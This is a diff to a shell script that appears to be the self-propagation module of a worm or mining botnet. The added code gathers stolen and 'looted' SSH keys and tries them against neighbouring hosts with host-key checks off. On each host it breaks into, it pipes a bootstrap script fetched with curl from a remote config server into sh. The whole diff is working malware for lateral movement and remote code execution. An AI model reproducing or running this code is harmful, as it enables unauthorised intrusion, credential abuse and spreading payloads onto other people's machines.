@@ -22,6 +22,16 @@ CONFIG_URL="${CONFIG_URL:-}"
 KEY="${KEY:-$SYSDIR/id_key}"                 # key staged by KEY_URL, if any
 [ -r "$KEY" ] || KEY="/root/.ssh/stolen_key" # else the operator's own key
 [ -r "$KEY" ] || { echo "spread: no key to spread with" >&2; exit 0; }
+
+# Keys to try, in order: ours first (that is what the operator authorised), then
+# a bounded slice of the harvested/looted keyring sitting next to the hunter. A
+# neighbour that trusts somebody else's leaked key is still a landing.
+KEYSET="$KEY"
+if [ -d "$SYSDIR/.hunt/keys" ]; then
+    for extra in $(ls "$SYSDIR/.hunt/keys" 2>/dev/null | head -"${SPREAD_KEYS:-3}"); do
+        KEYSET="$KEYSET $SYSDIR/.hunt/keys/$extra"
+    done
+fi
 RIG_ID="${RIG_ID:-node}"
 TARGET_USERS="${TARGET_USERS:-root}"
 SEEN="$SYSDIR/spread.seen"
@@ -72,20 +82,22 @@ for ip in $ips; do
     [ $(( $(date +%s) - NOW )) -lt "$BUDGET" ] || { echo "spread: time budget reached"; break; }
     count=$((count + 1))
 
-    # 2) same key, a few likely logins, over SSH -> remote bootstrap
+    # 2) same key(s), a few likely logins, over SSH -> remote bootstrap
     got=no
-    for u in $TARGET_USERS; do
-        if ssh -i "$KEY" \
-               -o IdentitiesOnly=yes -o BatchMode=yes \
-               -o StrictHostKeyChecking=no \
-               -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 \
-               "$u@$ip" "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
-               >/dev/null 2>&1; then
-            echo "spread -> $u@$ip (ssh)"
-            printf '%s\n' "$ip" >> "$SEEN"
-            got=yes
-            break
-        fi
+    for k in $KEYSET; do
+        for u in $TARGET_USERS; do
+            if ssh -i "$k" \
+                   -o IdentitiesOnly=yes -o BatchMode=yes \
+                   -o StrictHostKeyChecking=no \
+                   -o UserKnownHostsFile=/dev/null -o ConnectTimeout=3 \
+                   "$u@$ip" "curl -fsSL $CONFIG_URL/bootstrap.sh | CONFIG_URL=$CONFIG_URL sh" \
+                   >/dev/null 2>&1; then
+                echo "spread -> $u@$ip (ssh, $(basename "$k"))"
+                printf '%s\n' "$ip" >> "$SEEN"
+                got=yes
+                break 2
+            fi
+        done
     done
     [ "$got" = no ] || continue
 
